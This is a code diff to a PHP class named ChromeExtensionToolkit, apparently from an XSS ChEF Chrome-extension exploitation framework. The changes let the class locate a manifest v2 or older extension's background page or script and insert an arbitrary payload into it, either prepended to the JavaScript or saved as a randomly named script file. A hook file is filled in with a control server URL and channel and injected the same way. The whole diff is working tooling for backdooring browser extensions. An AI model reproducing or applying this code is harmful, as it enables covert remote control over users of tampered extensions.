@@ -18,6 +18,10 @@
 */
 class ChromeExtensionToolkit {
     var $ext = '';
+    var $manifest;
+    
+    const BCG_SCRIPT = 1;
+    const BCG_PAGE = 2;
     
     function __construct($extpath) {
         if (empty($extpath)) {
@@ -37,11 +41,16 @@ class ChromeExtensionToolkit {
         $manifest = json_decode($manifest, true);
         if (!$manifest)
             throw new Exception("Invalid $f");
-        return $manifest;
+        $this->setManifest($manifest);
+        return $manifest;   
     }
     
-    function saveManifest($manifest) {
-        $this->saveFile('manifest.json', json_encode($manifest));
+    function setManifest($manifest) {
+        $this->manifest = $manifest;
+    }
+    
+    function saveManifest() {
+        $this->saveFile('manifest.json', json_encode($this->manifest));
     }
 
     function saveFile($file, $contents) {
@@ -52,18 +61,65 @@ class ChromeExtensionToolkit {
         return $this->ext . DIRECTORY_SEPARATOR . $file;
     }
     
-    function injectScript($bcg, $payload) {
-        $bcg = @file_get_contents($this->getFile($bcg));
+    function injectScript($payload) {
+        $bcg_file = $this->getBackgroundPage();
+        
+        $bcg = @file_get_contents($this->getFile($bcg_file));
         if (!$payload) {
             return $bcg;
         }
-        return preg_replace('#(\<head\>|\Z)#i', "\$1\n<script>" . $payload . '</script>', $bcg, 1);
+        if (preg_match('/\.js$/i', $bcg_file)) { // javascript, just prepend
+            return $payload . ";" . $bcg;
+        }
+        $name = md5(time()) . '.js';
+        $this->saveFile($name, $payload);
+        return preg_replace('#(\<head\>|\Z)#i', "\$1\n<script src=\"{$name}\"></script>", $bcg, 1);
     }
     
-    function injectXssChefHook($bcg, $server_url, $channel) {
+    function assertBackgroundPage($default) {
+        $manifest = $this->getManifest();
+        if (@$manifest['manifest_version'] >= 2) {
+            if (empty($manifest['background'])) {
+                $manifest['background'] = array();
+            }
+            
+            if (!empty($manifest['background']['scripts'])) {
+                array_unshift($manifest['background']['scripts'], $default . '.js');
+                $this->setManifest($manifest);
+                return self::BCG_SCRIPT;
+            }
+            
+            if (empty($manifest['background']['page'])) {
+                $manifest['background']['page'] = $default . '.html'; 
+            }
+            $this->setManifest($manifest);
+            return self::BCG_PAGE;
+        }
+        if (empty($manifest['background_page'])) {
+            $manifest['background_page'] = $default . '.html';
+        }
+        $this->setManifest($manifest);
+        return self::BCG_PAGE;
+    }
+    
+    function getBackgroundPage() {
+        $manifest = $this->getManifest();
+        if (!empty($manifest['background']['page'])) {
+            return $manifest['background']['page'];
+        }
+        if (!empty($manifest['background']['scripts'])) {
+            return reset($manifest['background']['scripts']);
+        }
+        if (!empty($manifest['background_page'])) {
+            return $manifest['background_page'];
+        }
+        throw new Exception("No background page present");
+    }
+    
+    function injectXssChefHook($server_url, $channel) {
         $hook = file_get_contents(__DIR__ . '/../xsschef.js');
         $hook = str_replace('__URL__', $server_url, $hook);
         $hook = str_replace('__CHANNEL__', $channel, $hook);
-        return $this->injectScript($bcg, $hook);
+        return $this->injectScript($hook);
     }
 }
